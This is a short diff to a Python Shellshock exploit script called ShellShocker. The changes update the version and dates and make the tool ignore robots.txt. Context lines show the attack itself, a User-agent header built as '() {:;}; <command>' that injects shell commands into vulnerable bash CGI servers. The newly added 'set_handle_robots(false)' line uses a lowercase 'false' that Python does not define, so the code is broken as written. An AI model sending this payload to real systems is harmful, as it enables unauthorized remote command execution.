@@ -10,17 +10,12 @@
 #################################                  #
 
 # Stefano Belli <stefano9913@gmail.com> ][ Google+ : <http://plus.google.com/+StefanoBelli>
-# Last updated: [DD/MM/YYYY] 11/01/2015, [HH/MM] 03:34 PM # From 1.0rev3 data is correct
+# Last updated: [DD/MM/YYYY] 12/01/2015, [HH/MM] 10:00 AM # From 1.0rev3 data is correct
 # Status: initial release
 # support: posix (Unix) / Windows may require Cygwin[BATCH NOT SUPPORTED] due to unsupported things. Program runs.
 # Be free! Open Source <(C)
-# Version: 1.0rev3
-# Status: WORKING
-
-##
-# TO-DO: -add exception: mechanize._response.httperror_seek_wrapper "attacker()"
-#        - handling robots.txt 
-##
+# Version: 1.1
+# Status: Stable
 
 #Modules
 import os
@@ -47,8 +42,8 @@ i ADVIDSED you.
 :::.::.:::.::.:..::.::::.....:::..:::.
 ========================================\033[0m
 '''
-version = "1.0rev3"
-status = "Working"
+version = "1.1"
+status = "Stable"
 
 __main__ = '''
 ShellShocker <(C) | Exploit (Shell)
@@ -78,7 +73,7 @@ ShellShocker <(C) | Exploit (Shell)
       \033[34mDeveloper: Stefano Belli (--developer for more info(s) )
       Script version: %s
       GitHub: <http://github.com/StefanoBelli/shellshocker-python>Term
-      Last updated: 11/01/2015 [DD/MM/YYYY] @ 03:34 PM\033[0m
+      Last updated: 12/01/2015 [DD/MM/YYYY] @ 10:00 PM\033[0m
 
 Usage: shellshocker.py \033[33m<option>
 
@@ -190,6 +185,7 @@ def defineMechanize():
        print("\033[33m{!!} Mechanize was not installed. Run this script by: %s"%currentWorkDirectory)
        exit(1)
     br.addheaders = [('User-agent', '() {:;}; %s'%getCommand)]
+    br.set_handle_robots(false)
     
 #Main screen 
 def mainChooser():
